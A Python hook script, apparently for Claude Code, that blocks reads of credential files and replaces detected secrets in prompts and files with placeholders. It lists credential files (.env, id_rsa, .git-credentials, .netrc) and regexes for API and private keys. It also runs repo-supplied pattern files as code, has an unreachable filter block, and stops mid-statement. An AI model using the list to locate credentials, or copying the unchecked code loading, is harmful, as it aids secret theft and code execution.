#!/usr/bin/env python3
"""
Claude Secret Shield — Protect your secrets from Claude Code

Strategy 1: Block list — certain files are never read (.env, credentials, etc.)
Strategy 2: Pattern-based redact — secrets in ANY file are replaced with consistent placeholders
Strategy 3: Restore on write — placeholders are restored to real values when writing files

Global mapping stored at:  ~/.claude/.redact-mapping.json (persistent across sessions)
HMAC key stored at:        ~/.claude/.redact-hmac-key (deterministic placeholders)
File backups stored at:    /tmp/.claude-backup-{session_id}/

Hook input (stdin JSON):
  - tool_name: "Read" | "Write" | "Edit" | "Bash"
  - tool_input: { file_path, content, command, ... }
  - session_id: string
  - tool_result: (only present for PostToolUse hooks)

Hook output (stdout JSON):
  hookSpecificOutput.hookEventName = "PreToolUse" | "PostToolUse"
  hookSpecificOutput.permissionDecision = "allow" | "deny"
  hookSpecificOutput.permissionDecisionReason = string (when deny)
  hookSpecificOutput.updatedInput = {...} (when allow with modifications)

Exit codes:
  0 = allow (or deny via JSON output)
  Non-zero without JSON = error (Claude Code shows stderr)
"""

import subprocess
import sys
import json
import os
import re
import base64
import hashlib
import hmac
import tempfile
import shutil
import fcntl
import fnmatch
import stat as stat_module
import time
import uuid

# ── Debug logging ────────────────────────────────────────────────────────
DEBUG = os.environ.get("REDACT_DEBUG", "0") == "1"


def debug_log(msg):
    """Log to stderr when REDACT_DEBUG=1."""
    if DEBUG:
        print(f"[redact-restore {time.strftime('%H:%M:%S')}] {msg}", file=sys.stderr)

# ── Global mapping path and HMAC key ─────────────────────────────────────
GLOBAL_MAPPING_PATH = os.path.expanduser("~/.claude/.redact-mapping.json")
MAX_MAPPING_ENTRIES = 10000


def get_or_create_hmac_key():
    """Load or create a per-user HMAC key for deterministic placeholder generation."""
    key_path = os.path.expanduser("~/.claude/.redact-hmac-key")
    os.makedirs(os.path.dirname(key_path), exist_ok=True)
    if os.path.exists(key_path):
        with open(key_path, 'rb') as f:
            return f.read()
    key = os.urandom(32)
    fd = os.open(key_path, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o400)
    with os.fdopen(fd, 'wb') as f:
        f.write(key)
    return key


HMAC_KEY = get_or_create_hmac_key()

# Derive a Fernet encryption key from the HMAC key for encrypting the mapping file.
# Fernet requires a 32-byte base64url-encoded key.
try:
    from cryptography.fernet import Fernet
    _fernet_key = base64.urlsafe_b64encode(hashlib.sha256(HMAC_KEY + b"mapping-encryption").digest())
    FERNET = Fernet(_fernet_key)
except ImportError:
    FERNET = None  # Fallback: plaintext (with warning on first use)


# ── Load patterns ────────────────────────────────────────────────────────
# Import from patterns.py in the same directory, or fall back to inline
_SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
_patterns_loaded = False

try:
    # Try importing from the installed location first
    sys.path.insert(0, _SCRIPT_DIR)
    from patterns import BLOCKED_FILES, SECRET_PATTERNS
    _patterns_loaded = True
except ImportError:
    pass

if not _patterns_loaded:
    # Also check ~/.claude/hooks/ (where the installer copies files)
    _hooks_dir = os.path.expanduser("~/.claude/hooks")
    if os.path.isfile(os.path.join(_hooks_dir, "patterns.py")):
        sys.path.insert(0, _hooks_dir)
        try:
            from patterns import BLOCKED_FILES, SECRET_PATTERNS
            _patterns_loaded = True
        except ImportError:
            pass

if not _patterns_loaded:
    # Minimal fallback if patterns.py cannot be found
    BLOCKED_FILES = [
        ".env", ".env.local", ".env.production", ".env.staging",
        "credential.json", "credentials.json", "secrets.yaml", "secrets.json",
        "id_rsa", "id_ed25519", "id_ecdsa", ".pem", ".p12", ".pfx",
        "service-account.json", ".git-credentials", ".netrc",
    ]
    SECRET_PATTERNS = [
        ("OPENAI_KEY", r'sk-(?:proj-|svcacct-|admin-)?[A-Za-z0-9_-]{20,}T3BlbkFJ[A-Za-z0-9_-]{20,}'),
        ("ANTHROPIC_KEY", r'sk-ant-[a-zA-Z0-9_\-]{32,100}'),
        ("AWS_ACCESS_KEY", r'(?:A3T[A-Z0-9]|AKIA|ASIA|ABIA|ACCA)[A-Z2-7]{16}'),
        ("GITHUB_PAT_CLASSIC", r'ghp_[A-Za-z0-9]{36}'),
        ("STRIPE_SECRET_KEY", r'sk_live_[A-Za-z0-9]{24,}'),
        ("PRIVATE_KEY_BLOCK", r'-----BEGIN (?:RSA |DSA |EC |OPENSSH )?PRIVATE KEY-----'),
        ("GENERIC_SECRET", r'(?i)(?:secret|password|passwd|pwd)["\']?\s*[:=]\s*["\']?[^\s"\']{10,60}["\']?'),
    ]

# ── Load custom patterns (never overwritten by install.sh) ───────────────
#
# Two locations searched, in order:
#   1. Global       — _SCRIPT_DIR/custom-patterns.py  (~/.claude/hooks/)
#                     Shared across every project on this machine.
#   2. Per-project  — $CWD/.claude/custom-patterns.py
#                     A repo can ship its own patterns alongside its code
#                     so they travel with the project (committed + reviewed).
#                     Loaded second so per-project patterns can extend
#                     (not override) the global set.
#
# Both files share the same module surface:
#   CUSTOM_SECRET_PATTERNS = [("NAME", r"regex"), ...]
#   CUSTOM_BLOCKED_FILES   = ["sensitive.yaml", ...]
_LOADED_PATTERN_PATHS = set()


def _load_custom_patterns_from(path):
    """Idempotent — won't double-load the same file path.

    Also compiles any new regex and appends to COMPILED_PATTERNS so a
    later `_load_project_custom_patterns(payload_cwd)` from the
    dispatcher actually adds usable patterns (not just SECRET_PATTERNS
    list entries that nobody compiles)."""
    try:
        if not path or not os.path.exists(path):
            return
        abspath = os.path.abspath(path)
        if abspath in _LOADED_PATTERN_PATHS:
            return
        _LOADED_PATTERN_PATHS.add(abspath)

        import importlib.util
        spec = importlib.util.spec_from_file_location(
            f"custom_patterns_{abs(hash(abspath))}", abspath
        )
        custom_mod = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(custom_mod)
        if hasattr(custom_mod, "CUSTOM_SECRET_PATTERNS"):
            for name, regex in custom_mod.CUSTOM_SECRET_PATTERNS:
                SECRET_PATTERNS.append((name, regex))
                # Compile incrementally if COMPILED_PATTERNS already exists
                # (i.e. we're past initial module load and being called from
                # dispatcher with payload cwd).
                if "COMPILED_PATTERNS" in globals():
                    try:
                        COMPILED_PATTERNS.append((name, re.compile(regex)))
                    except re.error:
                        pass
        if hasattr(custom_mod, "CUSTOM_BLOCKED_FILES"):
            BLOCKED_FILES.extend(custom_mod.CUSTOM_BLOCKED_FILES)
    except Exception:
        # Never let a malformed user file crash the hook.
        pass


_load_custom_patterns_from(os.path.join(_SCRIPT_DIR, "custom-patterns.py"))


_PROJECT_MARKERS = (
    os.path.join(".claude", "custom-patterns.py"),
    ".git",
    ".hg",
)


def _walk_up_for_marker(start_dir):
    """Walk from `start_dir` upward (toward /) looking for any
    `_PROJECT_MARKERS` entry. Returns the directory containing the first
    match, or None if none found. Stops at filesystem root.

    Codex R3 [P1]: a user invoking Claude from `<repo>/src/...` should
    still trigger the repo-root's `.claude/custom-patterns.py`. Without
    this walk-up, the loader misses anything not directly in the cwd.
    """
    if not start_dir:
        return None
    try:
        d = os.path.abspath(start_dir)
    except OSError:
        return None
    seen = set()
    while d and d not in seen and d != os.path.dirname(d):
        seen.add(d)
        for marker in _PROJECT_MARKERS:
            if os.path.exists(os.path.join(d, marker)):
                return d
        d = os.path.dirname(d)
    return None


def _resolve_project_dir(payload_cwd=None):
    """
    Find the project root for loading per-project custom-patterns.py.

    For each candidate start dir, walk upward looking for either
    `.claude/custom-patterns.py` directly OR a VCS marker (`.git`,
    `.hg`). Falls through to next candidate if no marker found.

    Candidate priority:
      1. Explicit `payload_cwd` (hook payload's `cwd` field) — most
         authoritative when available (Codex R2 [P2]).
      2. $CLAUDE_PROJECT_DIR — Claude Code sets this in the hook env.
      3. `os.getcwd()` — last-resort fallback.

    Returns None if no candidate yields a marker.
    """
    candidates = []
    if payload_cwd:
        candidates.append(payload_cwd)
    env_dir = os.environ.get("CLAUDE_PROJECT_DIR")
    if env_dir:
        candidates.append(env_dir)
    try:
        candidates.append(os.getcwd())
    except OSError:
        pass

    for c in candidates:
        if not c or not os.path.isdir(c):
            continue
        root = _walk_up_for_marker(c)
        if root:
            return root
    return None


def _load_project_custom_patterns(payload_cwd=None):
    """
    Load (or re-load, idempotently) per-project custom patterns.

    The dispatcher should call this with `data.get("cwd")` early in each
    hook event so the authoritative payload-cwd path is honoured even if
    the interpreter's getcwd() and env are wrong.
    """
    target_dir = _resolve_project_dir(payload_cwd)
    if not target_dir:
        return
    _load_custom_patterns_from(os.path.join(target_dir, ".claude", "custom-patterns.py"))


_load_project_custom_patterns()

# ── Compile patterns once ────────────────────────────────────────────────
# (Subsequent `_load_project_custom_patterns(payload_cwd)` calls from the
# dispatcher will compile new patterns incrementally in-place — see
# `_load_custom_patterns_from` above.)
COMPILED_PATTERNS = []
for name, regex in SECRET_PATTERNS:
    try:
        COMPILED_PATTERNS.append((name, re.compile(regex)))
    except re.error:
        pass

# ── Binary file detection ────────────────────────────────────────────────
def is_binary_file(file_path):
    """Return True if the file appears to be binary (contains null bytes in first 8KB)."""
    try:
        with open(file_path, 'rb') as f:
            chunk = f.read(8192)
            return b'\x00' in chunk
    except (OSError, PermissionError):
        return False


# ── Allowlist (.claude-redact-ignore) ────────────────────────────────────
def is_ignored(file_path):
    """Check if file matches any pattern in .claude-redact-ignore."""
    for ignore_file in [os.path.join(os.getcwd(), '.claude-redact-ignore'),
                        os.path.expanduser('~/.claude-redact-ignore')]:
        if os.path.exists(ignore_file):
            try:
                with open(ignore_file) as f:
                    for pattern in f:
                        pattern = pattern.strip()
                        if pattern and not pattern.startswith('#'):
                            if fnmatch.fnmatch(file_path, pattern) or fnmatch.fnmatch(os.path.basename(file_path), pattern):
                                debug_log(f"File {file_path} ignored by pattern '{pattern}' in {ignore_file}")
                                return True
            except (OSError, PermissionError):
                pass
    return False


# ── Read hook input ──────────────────────────────────────────────────────
try:
    input_data = json.loads(sys.stdin.read())
except (json.JSONDecodeError, EOFError):
    debug_log("No valid JSON on stdin, exiting")
    sys.exit(0)

if not isinstance(input_data, dict):
    debug_log(f"Input is not a dict (type={type(input_data).__name__}), exiting")
    sys.exit(0)


def get_prompt_text(payload):
    """Extract the user prompt across Claude Code variants and wrappers."""
    candidates = [payload]
    nested = payload.get("data")
    if isinstance(nested, dict):
        candidates.append(nested)

    for candidate in candidates:
        for key in ("user_prompt", "prompt", "message"):
            value = candidate.get(key)
            if isinstance(value, str) and value:
                return value
    return ""


def get_prompt_storage_dir(payload):
    """Prefer Claude-provided project cwd over the hook process cwd."""
    for key in ("cwd", "project_dir"):
        value = payload.get(key)
        if isinstance(value, str) and value:
            return value
    return os.environ.get("CLAUDE_PROJECT_DIR") or os.getcwd()


def get_session_id(payload):
    """Extract a stable session identifier for prompt continuation state."""
    value = payload.get("session_id")
    if isinstance(value, str) and value:
        return value
    return "default"


def get_agent_scope(payload):
    """Scope prompt continuation to the current agent when available."""
    for key in ("agent_id", "agent_type", "transcript_path"):
        value = payload.get(key)
        if isinstance(value, str) and value:
            return value
    return "main"


def get_prompt_state_key(payload):
    """Use session + agent scope so parallel subagents do not share state."""
    return f"{get_session_id(payload)}::{get_agent_scope(payload)}"


def get_session_state_path(state_key):
    """Store per-agent prompt continuation state outside the repo."""
    session_hash = hashlib.sha256(state_key.encode("utf-8", errors="replace")).hexdigest()[:16]
    return os.path.join(tempfile.gettempdir(), f".claude-secret-shield-{session_hash}.json")


def load_session_state(state_key):
    path = get_session_state_path(state_key)
    try:
        with open(path, "r") as f:
            return json.load(f)
    except (OSError, json.JSONDecodeError):
        return None


def save_session_state(state_key, state):
    path = get_session_state_path(state_key)
    fd = os.open(path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
    with os.fdopen(fd, "w") as f:
        json.dump(state, f)


def delete_session_state(state_key):
    path = get_session_state_path(state_key)
    try:
        if os.path.exists(path):
            os.remove(path)
    except OSError:
        pass


def build_redacted_prompt(prompt):
    """Create a redacted copy of the prompt for safe additionalContext."""
    matches = []
    counters = {}

    for pattern_name, compiled_re in COMPILED_PATTERNS:
        for m in compiled_re.finditer(prompt):
            matched_value = m.group(0)
            if len(matched_value) < 8:
                continue
                # Skip false positives: bare camelCase variable names in GENERIC_SECRET
                # e.g. 'password: newPassword,' — newPassword is code, not a real secret
                if pattern_name == 'GENERIC_SECRET':
                    _parts = matched_value.split('=', 1) if '=' in matched_value else matched_value.split(':', 1)
                    if len(_parts) == 2:
                        _val = _parts[1].strip().strip('"\'').rstrip(',;) \\n')
                        if re.match(r'^[a-z][a-zA-Z]{2,}$', _val):
                            continue
            preview = matched_value[:6] + "..." + matched_value[-4:] if len(matched_value) > 14 else matched_value[:4] + "..."
            counters[pattern_name] = counters.get(pattern_name, 0) + 1
            placeholder = "{{" + f"{pattern_name}_{counters[pattern_name]}" + "}}"
            matches.append((m.start(), m.end(), pattern_name, matched_value, preview, placeholder))

    if not matches:
        return prompt, []

    matches.sort(key=lambda x: x[0], reverse=True)
    redacted = prompt
    used_ranges = []
    found_secrets = []
    for start, end, pattern_name, matched_value, preview, placeholder in matches:
        if any(start < used_end and end > used_start for used_start, used_end in used_ranges):
            continue
        redacted = redacted[:start] + placeholder + redacted[end:]
        used_ranges.append((start, end))
        found_secrets.append((pattern_name, preview))

    found_secrets.reverse()
    return redacted, found_secrets


def cleanup_prompt_artifacts_from_paths(*paths):
    """Delete temporary prompt files created for the go/continue flow."""
    for path in paths:
        if not path:
            continue
        try:
            if os.path.exists(path):
                os.remove(path)
                debug_log(f"Deleted prompt artifact: {path}")
        except OSError:
            pass


def cleanup_prompt_artifacts_in_dir(base_dir):
    """Best-effort cleanup for both legacy and nonce prompt temp files."""
    if not base_dir or not os.path.isdir(base_dir):
        return
    for name in os.listdir(base_dir):
        if re.match(r"^\.tmp_secrets(?:\.[a-f0-9]{12})?(?:\.prompt\.txt|\.conf)$", name):
            cleanup_prompt_artifacts_from_paths(os.path.join(base_dir, name))


def cleanup_legacy_prompt_artifacts_in_dir(base_dir):
    """Only clean up legacy shared prompt temp files."""
    if not base_dir or not os.path.isdir(base_dir):
        return
    for name in (".tmp_secrets.conf", ".tmp_secrets.prompt.txt"):
        cleanup_prompt_artifacts_from_paths(os.path.join(base_dir, name))


def cleanup_prompt_artifacts_for_session(state_key):
    state = load_session_state(state_key)
    if not state:
        return
    cleanup_prompt_artifacts_from_paths(state.get("tmp_file"), state.get("tmp_context_file"))
    delete_session_state(state_key)


# ── Tmp-secrets exclude registration (moved above handlers so it's in
# scope when UserPromptSubmit fires) ───────────────────────────────────
TMP_SECRETS_EXCLUDES = [
    "/.tmp_secrets.conf",
    "/.tmp_secrets.prompt.txt",
    "/.tmp_secrets.*.conf",
    "/.tmp_secrets.*.prompt.txt",
]


def _find_repo_root(start_dir):
    d = os.path.abspath(start_dir) if start_dir else None
    while d and d != os.path.dirname(d):
        marker = os.path.join(d, ".git")
        if os.path.isdir(marker) or os.path.isfile(marker):
            return d
        d = os.path.dirname(d)
    return None


def _ensure_git_exclude(repo_root, entries):
    """Idempotently append `entries` to git's local exclude list
    (<repo>/.git/info/exclude, or the worktree's equivalent). Uses
    `git rev-parse --git-path info/exclude` so it handles linked
    worktrees correctly. Fails silently — housekeeping only."""
    if not repo_root:
        return
    try:
        r = subprocess.run(
            ["git", "-C", repo_root, "rev-parse", "--git-path", "info/exclude"],
            capture_output=True, text=True, timeout=3,
        )
        exclude_path = r.stdout.strip() if r.returncode == 0 else ""
        if not exclude_path:
            return
        if not os.path.isabs(exclude_path):
            exclude_path = os.path.join(repo_root, exclude_path)
        os.makedirs(os.path.dirname(exclude_path), exist_ok=True)
        existing = set()
        if os.path.isfile(exclude_path):
            with open(exclude_path, "r", encoding="utf-8") as f:
                existing = set(f.read().splitlines())
        to_add = [e for e in entries if e not in existing]
        if not to_add:
            return
        with open(exclude_path, "a", encoding="utf-8") as f:
            if existing:
                f.write("\n")
            f.write("# Added by redmem (shield)\n")
            for e in to_add:
                f.write(e + "\n")
        debug_log(f"Added tmp-secret patterns to {exclude_path}")
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
        debug_log(f"git-exclude register skipped: {e.__class__.__name__}")


try:
    # ══════════════════════════════════════════════════════════════════════════
    # UserPromptSubmit: Scan user prompt for secrets before sending to API
    # ══════════════════════════════════════════════════════════════════════════
    hook_event = input_data.get("hook_event_name", "")
    if hook_event == "UserPromptSubmit":
        prompt = get_prompt_text(input_data)
        prompt_dir = get_prompt_storage_dir(input_data)
        state_key = get_prompt_state_key(input_data)

        # ── Helper: build "go" continuation response ────────────────────────
        def _build_go_response(state):
            """Build additionalContext for go/pass continuation."""
            tmp_file = state.get("tmp_file")
            tmp_context_file = state.get("tmp_context_file")
            if not tmp_file or not os.path.exists(tmp_file):
                return None
            redacted_prompt = ""
            try:
                with open(tmp_context_file, "r") as tf:
                    redacted_prompt = tf.read().strip()
            except OSError:
                pass
            additional_context = (
                "[claude-secret-shield] The user's previous prompt was blocked because it "
                "contained secrets. This message is confirmation to continue that same request.\n\n"
                f"Read {tmp_file} now. That file is safe to read because secrets will be shown "
                "to you as redacted placeholders.\n\n"
                "Important: treat those placeholders as the actual values for the task. If you "
                "need to write files, edit files, or run commands, use the placeholders exactly "
                "as they appear. claude-secret-shield will automatically restore the real secret "
                "values before execution when appropriate.\n\n"
                "Do not ask the user to manually substitute the values or run the command "
                "themselves just because the secrets are redacted. Continue the original "
                "request normally using the placeholderized values."
            )
            if redacted_prompt:
                additional_context += f"\n\nPreviously blocked prompt (redacted):\n{redacted_prompt}"
            return additional_context

        # ── Check "pass" bypass counter ─────────────────────────────────────
        # pass_remaining: >0 = allow N prompts, -1 = disabled for session, 0/absent = normal
        state = load_session_state(state_key)
        pass_remaining = (state or {}).get("pass_remaining", 0)

        if prompt:
            redacted_prompt, found_secrets = build_redacted_prompt(prompt)
            if found_secrets:
                # Check if pass bypass is active
                if pass_remaining == -1:
                    # pass off — disabled for session, allow through
                    debug_log("UserPromptSubmit: pass off active, allowing prompt with secrets")
                    sys.exit(0)
                if pass_remaining > 0:
                    # Decrement pass counter and allow
                    new_remaining = pass_remaining - 1
                    if state:
                        state["pass_remaining"] = new_remaining
                        save_session_state(state_key, state)
                    debug_log(f"UserPromptSubmit: pass active ({new_remaining} remaining), allowing")
                    sys.exit(0)

                # Normal block flow
                nonce = uuid.uuid4().hex[:12]
                tmp_file = os.path.join(prompt_dir, f".tmp_secrets.{nonce}.conf")
                tmp_context_file = os.path.join(prompt_dir, f".tmp_secrets.{nonce}.prompt.txt")
                secret_list = ", ".join(f"{n} ({p})" for n, p in found_secrets[:5])
                extra = f" and {len(found_secrets) - 5} more" if len(found_secrets) > 5 else ""
                # Save the full prompt plus a redacted companion so "go" can restore intent safely.
                try:
                    os.makedirs(prompt_dir, exist_ok=True)
                    with open(tmp_file, "w") as tf:
                        tf.write(prompt)
                    with open(tmp_context_file, "w") as tf:
                        tf.write(redacted_prompt)
                    os.chmod(tmp_file, 0o600)
                    os.chmod(tmp_context_file, 0o600)
                    # Register patterns in .git/info/exclude proactively on
                    # FIRST create (not just on Read), so these files never
                    # show up in `git status` even if Claude never reads them.
                    _ensure_git_exclude(_find_repo_root(prompt_dir),
                                        TMP_SECRETS_EXCLUDES)
                    previous_state = load_session_state(state_key)
                    new_state = {
                        "nonce": nonce,
                        "prompt_dir": prompt_dir,
                        "tmp_file": tmp_file,
                        "tmp_context_file": tmp_context_file,
                        "pass_remaining": 0,
                    }
                    save_session_state(state_key, new_state)
                    if previous_state:
                        cleanup_prompt_artifacts_from_paths(
                            previous_state.get("tmp_file"),
                            previous_state.get("tmp_context_file"),
                        )
                    debug_log(f"Saved prompt to {tmp_file}")
                    saved = True
                except OSError as e:
                    debug_log(f"Failed to save prompt: {e}")
                    saved = False
                if saved:
                    reason = (
                        f"🛡️ claude-secret-shield: secret detected ({secret_list}{extra}).\n\n"
                        f"Your prompt has been safely saved. Secrets will be auto-redacted when read.\n\n"
                        f"Reply:\n"
                        f"  \"go\"       — continue with secrets auto-redacted\n"
                        f"  \"pass\"     — allow this prompt as-is (bypass redaction once)\n"
                        f"  \"pass N\"   — bypass for this + next N-1 prompts\n"
                        f"  \"pass off\" — disable prompt scanning for this session"
                    )
                else:
                    reason = (
                        f"🛡️ claude-secret-shield: secret detected ({secret_list}{extra}).\n\n"
                        f"Could not save prompt automatically.\n"
                        f"Please save your secret to .tmp_secrets.conf, then tell Claude to read it."
                    )
                debug_log(f"UserPromptSubmit BLOCKED: {[n for n,_ in found_secrets]}")
                print(json.dumps({
                    "decision": "block",
                    "reason": reason
                }))
                sys.exit(0)

        # ── Check "go" to continue from a blocked prompt ────────────────────
        if prompt.strip().lower() in ("go", "go.", "继续", "continue"):
            state = load_session_state(state_key)
            if state:
                additional_context = _build_go_response(state)
                if additional_context:
                    debug_log("UserPromptSubmit: 'go' detected, adding context")
                    print(json.dumps({
                        "hookSpecificOutput": {
                            "hookEventName": "UserPromptSubmit",
                            "additionalContext": additional_context
                        }
                    }))
                    sys.exit(0)

        # ── Check "pass" / "pass N" / "pass off" command ────────────────────
        pass_match = re.match(r'^pass(?:\s+(off|\d+))?\s*$', prompt.strip().lower())
        if pass_match:
            state = load_session_state(state_key)
            if state and state.get("tmp_file") and os.path.exists(state.get("tmp_file", "")):
                arg = pass_match.group(1)
                if arg == "off":
                    pass_count = -1  # sentinel: disabled for session
                    debug_log("UserPromptSubmit: 'pass off' — disabling prompt scanning for session")
                elif arg:
                    pass_count = min(max(int(arg), 1), 100)
                    debug_log(f"UserPromptSubmit: 'pass {pass_count}' — allowing {pass_count} prompts")
                else:
                    pass_count = 1  # pass = pass 1
                    debug_log("UserPromptSubmit: 'pass' — allowing current prompt")

                # Set pass_remaining for FUTURE prompts (current one is handled by go mechanism)
                # pass 1 = allow current only → future remaining = 0
                # pass 3 = allow current + 2 more → future remaining = 2
                # pass off = disable → future remaining = -1
                if pass_count == -1:
                    state["pass_remaining"] = -1
                else:
                    state["pass_remaining"] = max(pass_count - 1, 0)
                save_session_state(state_key, state)

                # Allow current prompt through (same as "go" but without redaction context)
                additional_context = (
                    "[claude-secret-shield] The user used 'pass' to bypass secret scanning for this prompt. "
                    "The original prompt contained values that triggered secret detection, but the user "
                    "confirmed they are safe to send (e.g. transaction hashes, not private keys).\n\n"
                    "Proceed with the user's original request. The prompt content will be sent as-is."
                )
                # Re-read the original prompt
                try:
                    with open(state["tmp_file"], "r") as tf:
                        original_prompt = tf.read().strip()
                    additional_context += f"\n\nOriginal prompt:\n{original_prompt}"
                except OSError:
                    pass

                print(json.dumps({
                    "hookSpecificOutput": {
                        "hookEventName": "UserPromptSubmit",
                        "additionalContext": additional_context
                    }
                }))
                sys.exit(0)

        # No secrets found — allow prompt
        debug_log("UserPromptSubmit: no secrets found, allowing")
        sys.exit(0)

    tool_name = input_data.get("tool_name", "")
    tool_input = input_data.get("tool_input", {})
    session_id = input_data.get("session_id", "default")
    is_post_hook = "tool_result" in input_data

    debug_log(f"Hook start: tool={tool_name} post={is_post_hook} session={session_id}")

    MAPPING_FILE = GLOBAL_MAPPING_PATH
    BACKUP_DIR = os.path.join(tempfile.gettempdir(), f".claude-backup-{session_id}")


    # ── Backup management ───────────────────────────────────────────────────
    def backup_path_for(file_path):
        """Get the backup file path prefix for a given original file."""
        path_hash = hashlib.sha256(file_path.encode()).hexdigest()[:16]
        return os.path.join(BACKUP_DIR, path_hash)


    def restore_pending_backups():
        """Restore any pending backups from a previous crash."""
        if not os.path.isdir(BACKUP_DIR):
            return
        for entry in os.listdir(BACKUP_DIR):
            if not entry.endswith(".meta"):
                continue
            meta_path = os.path.join(BACKUP_DIR, entry)
            try:
                with open(meta_path) as f:
                    meta = json.load(f)
                original_path = meta["original_path"]
                bak_path = os.path.join(BACKUP_DIR, entry[:-5] + ".bak")
                if os.path.exists(bak_path) and os.path.isfile(original_path):
                    # Safety check: if the file on disk has different content
                    # than the backup, a Write/Edit already overwrote it.
                    # Restoring the backup would silently discard that write.
                    # Only restore if the file still matches the redacted state
                    # (i.e., the tool never ran or failed before writing).
                    try:
                        with open(original_path, "rb") as f:
                            current_hash = hashlib.sha256(f.read()).hexdigest()
                        with open(bak_path, "rb") as f:
                            bak_bytes = f.read()
                        bak_hash = hashlib.sha256(bak_bytes).hexdigest()
                        # If hashes match, file was never overwritten — restore
                        # (this handles the Read redact case: file is redacted,
                        #  crash, restore original)
                        # If hashes differ AND file doesn't contain redacted
                        # content, a Write completed — don't restore.
                        if current_hash != bak_hash:
                            # File changed since backup. Check if it still has
                            # placeholders (= redacted, tool didn't finish).
                            with open(original_path, "r", errors="replace") as f:
                                disk_content = f.read()
                            placeholder_re = re.compile(r'\{\{[A-Z0-9_]+_[a-f0-9]{8}x*\}\}')
                            if not placeholder_re.search(disk_content):
                                # No placeholders = Write completed with real data.
                                # Don't restore old backup.
                                debug_log(f"Crash recovery: skipping {original_path} (Write completed)")
                                for p in (meta_path, bak_path):
                                    if os.path.exists(p):
                                        os.remove(p)
                                continue
                        # Either hashes match (restore redacted -> original)
                        # or file has placeholders (tool failed mid-write, restore)
                        shutil.copy2(bak_path, original_path)
                    except (OSError, PermissionError):
                        shutil.copy2(bak_path, original_path)
                    # Restore original permissions and timestamps from metadata
                    if "mode" in meta:
                        os.chmod(original_path, meta["mode"])
                    if "atime" in meta and "mtime" in meta:
                        os.utime(original_path, (meta["atime"], meta["mtime"]))
                for p in (meta_path, bak_path):
                    if os.path.exists(p):
                        os.remove(p)
            except (json.JSONDecodeError, OSError, KeyError):
                try:
                    os.remove(meta_path)
                except OSError:
                    pass


    # Restore pending backups on startup (crash recovery).
    # Only for PreToolUse — PostToolUse means the tool completed normally,
    # so backups from this cycle should be handled by the PostToolUse handler.
    if not is_post_hook:
        restore_pending_backups()


    # ── Mapping management ───────────────────────────────────────────────────
    def load_mapping():
        """Load the global mapping file (encrypted if Fernet available). Returns empty mapping on any error."""
        path = MAPPING_FILE
        try:
            if os.path.exists(path):
                # Permission enforcement: fix group/other access
                st = os.stat(path)
                if st.st_mode & 0o077:
                    os.chmod(path, 0o600)
                with open(path, 'rb') as f:
                    fcntl.flock(f.fileno(), fcntl.LOCK_SH)
                    raw = f.read()
                    fcntl.flock(f.fileno(), fcntl.LOCK_UN)

                # Try decrypting (Fernet encrypted)
                if FERNET and raw:
                    try:
                        decrypted = FERNET.decrypt(raw)
                        data = json.loads(decrypted)
                    except Exception:
                        # Fallback: try reading as plaintext (migration from unencrypted)
                        try:
                            data = json.loads(raw)
                            debug_log("Loaded plaintext mapping, will re-save encrypted")
                        except (json.JSONDecodeError, UnicodeDecodeError):
                            return {"secret_to_placeholder": {}, "placeholder_to_secret": {}}
                else:
                    # No Fernet: plaintext mode
                    data = json.loads(raw)

                data.pop("counters", None)
                data.setdefault("secret_to_placeholder", {})
                data.setdefault("placeholder_to_secret", {})
                return data
        except (json.JSONDecodeError, OSError, PermissionError, UnicodeDecodeError):
            pass
        return {"secret_to_placeholder": {}, "placeholder_to_secret": {}}


    def save_mapping(mapping):
        """Persist the global mapping file (encrypted) with restricted permissions and LRU eviction."""
        try:
            # Evict oldest entries if over limit
            if len(mapping.get("secret_to_placeholder", {})) > MAX_MAPPING_ENTRIES:
                entries = list(mapping["secret_to_placeholder"].items())
                keep = entries[len(entries) // 2:]
                mapping["secret_to_placeholder"] = dict(keep)
                mapping["placeholder_to_secret"] = {v: k for k, v in mapping["secret_to_placeholder"].items()}
                debug_log(f"Evicted {len(entries) - len(keep)} old mapping entries")

            mapping.pop("counters", None)

            json_bytes = json.dumps(mapping).encode('utf-8')

            # Encrypt if Fernet available
            if FERNET:
                payload = FERNET.encrypt(json_bytes)
            else:
                payload = json_bytes

            os.makedirs(os.path.dirname(MAPPING_FILE), exist_ok=True)
            fd = os.open(MAPPING_FILE, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
            with os.fdopen(fd, "wb") as f:
                fcntl.flock(f.fileno(), fcntl.LOCK_EX)
                f.write(payload)
                fcntl.flock(f.fileno(), fcntl.LOCK_UN)
            debug_log(f"Mapping saved ({'encrypted' if FERNET else 'plaintext'}): {len(mapping.get('secret_to_placeholder', {}))} secrets")
        except OSError:
            pass


    def get_placeholder(mapping, secret_value, pattern_name):
        """Get or create a deterministic HMAC-based placeholder for a secret value."""
        if secret_value in mapping["secret_to_placeholder"]:
            return mapping["secret_to_placeholder"][secret_value]

        digest = hmac.new(HMAC_KEY, secret_value.encode('utf-8', errors='replace'), hashlib.sha256).hexdigest()[:8]
        placeholder = "{{" + f"{pattern_name}_{digest}" + "}}"

        # Handle unlikely hash collision
        while placeholder in mapping["placeholder_to_secret"] and mapping["placeholder_to_secret"][placeholder] != secret_value:
            digest = digest + "x"
            placeholder = "{{" + f"{pattern_name}_{digest}" + "}}"

        mapping["secret_to_placeholder"][secret_value] = placeholder
        mapping["placeholder_to_secret"][placeholder] = secret_value
        return placeholder


    # ── Redact / Restore ─────────────────────────────────────────────────────
    def redact_content(content, mapping):
        """Scan content for secrets and replace with placeholders.

        Returns (redacted_content, found_any_secrets).
        The mapping is mutated in place and must be saved by the caller.
        """
        # Collect all matches with their positions first
        matches = []
        for pattern_name, compiled in COMPILED_PATTERNS:
            for m in compiled.finditer(content):
                matched_value = m.group(0)
                if len(matched_value) < 8:
                    continue
                placeholder = get_placeholder(mapping, matched_value, pattern_name)
                matches.append((m.start(), m.end(), matched_value, placeholder, pattern_name))

        if not matches:
            return content, False

        # Auto-suppress HEX_CREDENTIAL_BARE if too many matches in one file.
        # This indicates a Web3 project with many tx hashes / bytes32 values.
        BARE_HEX_THRESHOLD = 3
        bare_count = sum(1 for *_, name in matches if name == "HEX_CREDENTIAL_BARE")
        if bare_count > BARE_HEX_THRESHOLD:
            debug_log(
